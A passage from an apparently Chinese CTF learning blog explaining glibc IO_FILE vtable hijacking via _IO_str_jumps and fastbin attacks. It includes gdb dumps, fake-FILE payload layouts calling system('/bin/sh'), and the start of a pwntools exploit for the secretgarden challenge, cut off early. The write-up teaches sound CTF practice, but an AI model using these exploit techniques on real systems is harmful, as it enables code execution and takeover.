&lt;_IO_2_1_stdin_+<span class="number">48</span>&gt;:	<span class="number">0x0000000000602010</span>	<span class="number">0x0000000000602010</span></span><br><span class="line"><span class="number">0x7ffff7dd1920</span> &lt;_IO_2_1_stdin_+<span class="number">64</span>&gt;:	<span class="number">0x0000000000602410</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1930</span> &lt;_IO_2_1_stdin_+<span class="number">80</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1940</span> &lt;_IO_2_1_stdin_+<span class="number">96</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1950</span> &lt;_IO_2_1_stdin_+<span class="number">112</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="number">0x7ffff7dd1960</span> &lt;_IO_2_1_stdin_+<span class="number">128</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007ffff7dd3790</span></span><br><span class="line"><span class="number">0x7ffff7dd1970</span> &lt;_IO_2_1_stdin_+<span class="number">144</span>&gt;:	<span class="number">0xffffffffffffffff</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1980</span> &lt;_IO_2_1_stdin_+<span class="number">160</span>&gt;:	<span class="number">0x00007ffff7dd19c0</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1990</span> &lt;_IO_2_1_stdin_+<span class="number">176</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19a0</span> &lt;_IO_2_1_stdin_+<span class="number">192</span>&gt;:	<span class="number">0x00000000ffffffff</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19b0</span> &lt;_IO_2_1_stdin_+<span class="number">208</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007ffff7dd06e0</span></span><br></pre></td></tr></table></figure>
<p>可以看到缓冲区就是从堆分配的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk                </span><br><span class="line"><span class="number">0x602000</span>            <span class="number">0x0</span>                 <span class="number">0x410</span>                Used                None              None</span><br></pre></td></tr></table></figure>
<p>执行一次scanf后，可以看到缓冲区中有我们输入的数据字符’c’</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /<span class="number">10</span>xg <span class="number">0x602000</span></span><br><span class="line"><span class="number">0x602000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000411</span></span><br><span class="line"><span class="number">0x602010</span>:	<span class="number">0x0000000000000a63</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000000000</span></span><br></pre></td></tr></table></figure>
<p>也就是说如果我们能够修改_IO_buf_base、_IO_buf_end域，我们就可以进行任意地址的读写。</p>
<p>###_IO_str_jumps<br>libc中不仅仅只有_IO_file_jumps这么一个vtable，还有一个叫_IO_str_jumps的，这个vtable不在check的范围之内。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>如果我们能设置文件指针的 vtable 为 _IO_str_jumps 么就能调用不一样的文件操作函数。</p>
<h3 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_str_overflow (_IO_FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> flush_only = c == EOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)<span class="comment">// pass</span></span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))<span class="comment">// should in </span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span> <span class="comment">// pass</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">char</span> *new_buf;</span><br><span class="line">      <span class="keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">      _IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)<span class="comment">//pass 一般会通过</span></span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf</span><br><span class="line">        = (<span class="keyword">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);<span class="comment">//target [fp+0xe0]</span></span><br><span class="line">      <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">          <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (old_buf)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">          (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">          <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">          fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">      _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">      fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="keyword">unsigned</span> <span class="keyword">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure>
<p>利用以下代码来劫持程序流程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new_buf = (<span class="keyword">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br></pre></td></tr></table></figure>
<p>几个条件bypass：<br>1.fp-&gt;_flags &amp; _IO_NO_WRITES为假<br>2.(pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) &gt;= ((fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + flush_only(1))<br>3.fp-&gt;_flags &amp; _IO_USER_BUF(0x01)为假<br>4.2*(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100 不能为负数<br>5.new_size = 2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100; 应当指向/bin/sh字符串对应的地址<br>6.fp+0xe0指向system地址<br>构造</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_flags = <span class="number">0</span></span><br><span class="line">_IO_write_base = <span class="number">0</span></span><br><span class="line">_IO_write_ptr = (binsh_in_libc_addr <span class="number">-100</span>) / <span class="number">2</span> +<span class="number">1</span></span><br><span class="line">_IO_buf_end = (binsh_in_libc_addr <span class="number">-100</span>) / <span class="number">2</span> </span><br><span class="line"></span><br><span class="line">_freeres_list = <span class="number">0x2</span></span><br><span class="line">_freeres_buf = <span class="number">0x3</span></span><br><span class="line">_mode = <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">vtable = _IO_str_jumps - <span class="number">0x18</span></span><br></pre></td></tr></table></figure>
<h3 id="finish"><a href="#finish" class="headerlink" title="finish"></a>finish</h3><p>原理与overflow类似</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="keyword">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  <span class="comment">//[fp+0xe8]</span></span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>几个条件 bypass：<br>1._IO_buf_base 不为空<br>2._flags &amp; _IO_USER_BUF(0x01) 为假<br>构造：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_flags = (binsh_in_libc + <span class="number">0x10</span>) &amp; ~<span class="number">1</span></span><br><span class="line">_IO_buf_base = binsh_addr</span><br><span class="line"></span><br><span class="line">_freeres_list = <span class="number">0x2</span></span><br><span class="line">_freeres_buf = <span class="number">0x3</span></span><br><span class="line">_mode = <span class="number">-1</span></span><br><span class="line">vtable = _IO_str_finish - <span class="number">0x18</span></span><br><span class="line">fp+<span class="number">0xe8</span> -&gt; system_addr</span><br></pre></td></tr></table></figure>




      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/06/19/IO-FILE%E5%AD%A6%E4%B9%A0/" data-id="ckq65rr230001c4u63oj18rud" data-title="IO_FILE学习" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-pwn学习思维导图参考" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/06/19/pwn%E5%AD%A6%E4%B9%A0%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E5%8F%82%E8%80%83/" class="article-date">
  <time class="dt-published" datetime="2021-06-19T14:20:23.000Z" itemprop="datePublished">2021-06-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/06/19/pwn%E5%AD%A6%E4%B9%A0%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E5%8F%82%E8%80%83/">Pwn学习思维导图参考</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p><img src="/2021/06/19/pwn%E5%AD%A6%E4%B9%A0%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E5%8F%82%E8%80%83/1.jpg" alt="1.jpg"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/06/19/pwn%E5%AD%A6%E4%B9%A0%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E5%8F%82%E8%80%83/" data-id="ckq4sxh21000038u6biiw4koo" data-title="Pwn学习思维导图参考" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-fastbin-attack" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/06/19/fastbin-attack/" class="article-date">
  <time class="dt-published" datetime="2021-06-19T13:26:15.000Z" itemprop="datePublished">2021-06-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/06/19/fastbin-attack/">Fastbin Attack</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>要了解fastbin attack，首先得了解fastbin机制。由于libc2.26后加入了tcache机制，我们这里就分析glibc 2.23.<br>下面代码选自glibc2.23</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> _int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  size = chunksize (p);    <span class="comment">//获取p的size</span></span><br><span class="line">  check_inuse_chunk(av, p);<span class="comment">//检查p的物理相邻的下一个堆块的inuse位是否置1</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//检查p的大小是否小于global_max_fast</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line">      <span class="meta">#<span class="meta-keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line">          <span class="comment">//检查p物理相邻的堆块是否是top chunk</span></span><br><span class="line">          &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line">      <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      ) </span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//检查p的物理相邻下个堆块是否存在,且大小是否满足最小和最大要求</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">	       || __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">			     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">        &#123;.......&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//对chunk的data块通过memset赋值，但是默认情况下是不进行操作    </span></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line">    <span class="comment">//设置 malloc_state的flag</span></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取p对应大小的fastbinY的索引</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    <span class="comment">//fb指向对应大小的fastbinY的地址</span></span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    <span class="comment">// old为 对应大小的fastbinY的fd值，也就是第一个对块的地址</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">      	 <span class="comment">// Check that the top of the bin is not the record we are going to add</span></span><br><span class="line">         <span class="comment">//检查 fastbin中对应的bin的第一项 是否 等于 p (新加入的堆块)</span></span><br><span class="line">        	<span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      	  &#123;</span><br><span class="line">      	    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">      	    <span class="keyword">goto</span> errout;</span><br><span class="line">      	  &#125;</span><br><span class="line">          <span class="comment">//获取 fastbin中对应的bin的第一项的索引。</span></span><br><span class="line">        	<span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">        	  old_idx = fastbin_index(chunksize(old));</span><br><span class="line">          <span class="comment">//让  p 的fd指向 顶部的fastbin块</span></span><br><span class="line">        	p-&gt;fd = old2 = old;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br><span class="line">    <span class="comment">//catomic_compare_and_exchange_val_rel 功能是 如果*fb等于old2，则将*fb存储为p，返回old2；</span></span><br><span class="line">    <span class="comment">// *fb=p 也就是 让对应fastbin的fd指向 p(新加入的堆块)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查fastbin中对应的bin的第一项的大小是否与p(要添加的块)的大小相同。</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        	errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line">        	<span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到fastbin只是检查了fastbin第一个chunk是否与新加入的chunk相同。所以我们可以使用free(0) free(1) free(0)的方式来达到double free。之后还检查大小满足要求，通过size算出fastbin_index然后再比对。如果对应的fastbinY大小为0x70,64位的话size可以在0~0xF之间浮动，也就是说size为0x70-0x7f都会被认为是合法的。32位同理，在0-0x7之间浮动。</p>
<p><strong>利用前提：</strong><br>1、能创建fastbin类型的chunk<br>2、存在堆溢出、use-after-free等能控制chunk内容的漏洞<br>如果细分的话，可以做以下的分类：<br>3、fastbin double free<br>即利用double free漏洞构造chunk如下图所示<br><img src="/2021/06/19/fastbin-attack/1.jpg" alt="1.jpg"><br>我们首先申请回chunk1然后修改其fd值指向一个fake_chunk，这里的chunk要保证size域合法，我们再次申请3次同样的chunk,就会依次拿到chunk2，chunk1，fake_chunk。我们只要在关键位置伪造fake_chunk就可以了。例如在malloc_hook左右伪造fake_chunk，然后修改malloc_hook的值为one_gadget就可以在调用malloc时get_shell。</p>
<h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><p>同fastbin double free利用手法类似，只不过只需要free依次，然后修改FD指针指向fake_chunk。</p>
<h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h1><p>该技术的核心在于目标位置处伪造fastbin chunk，并将其释放，再申请回来，从而达到分配指定地址的chunk的目的。<br>    ### 可以free你指定位置的fake_chunk<br>    ### 要想构造fastbin fake chunk，并且将其释放时，可以将其放入到对应的fastbin链表当中，需要绕过一些必要的检测，即<br>        ##### fake chunk的ISMMAP位不能为1，因为free时，如果是mmap的chunk，就会单独处理。<br>        ##### fake chunk地址需要对齐，32位8字节对齐，64位16字节对齐<br>          ##### fake chunk的size大小需要满足fastbin的需求<br>          ##### fake chunk的next chunk的大小合理</p>
<h1 id="alloc-to-stack"><a href="#alloc-to-stack" class="headerlink" title="alloc to stack"></a>alloc to stack</h1><p>该技术的核心点在于劫持fastbin链表中的chunk的fd指针，把fd指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。</p>
<h1 id="arbitrary-alloc"><a href="#arbitrary-alloc" class="headerlink" title="arbitrary alloc"></a>arbitrary alloc</h1><p>arbitrary alloc 其实与alloc to stack是完全相同的，唯一的区别就是分配的目标不是在栈中。我们可以把chunk分配到任意可写的内存中，比如bss、heap、data、stack等等。</p>
<h1 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h1><p>以上是fastbin attack的集中方法，总结起来就是3步：<br>①伪造合理的chunk<br>②使得fd指向fake_chunk，或者free fake_chunk。使得fake_chunk加入到fastbin中<br>③分配得到fake_chunk，进行后续利用</p>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>hitcontraining_secretgarden，libc为2.23<br>首先检查一下保护<br><img src="/2021/06/19/fastbin-attack/2.jpg" alt="2.jpg"><br>main函数，有增删查，没有改<br><img src="/2021/06/19/fastbin-attack/3.jpg" alt="3.jpg"><br>漏洞点,del函数free的时候指针没有清零。并且free前没有检查flowerlist[i][0]的值是否为1<br><img src="/2021/06/19/fastbin-attack/4.jpg" alt="4.jpg"><br>其他都是常规操作</p>
<p>程序留有后门，我们也可以劫持函数的got来实现调用后门。但是我们这里使用的是劫持__malloc_hook，由于one_gadget不能用，我们通过__libc_realloc来改变栈环境，使得one_gadget条件成立。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./secretgarden&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">length,name,color</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name :&#x27;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;flower :&#x27;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;flower :&#x27;</span>,color)<span class="comment">#0x17</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 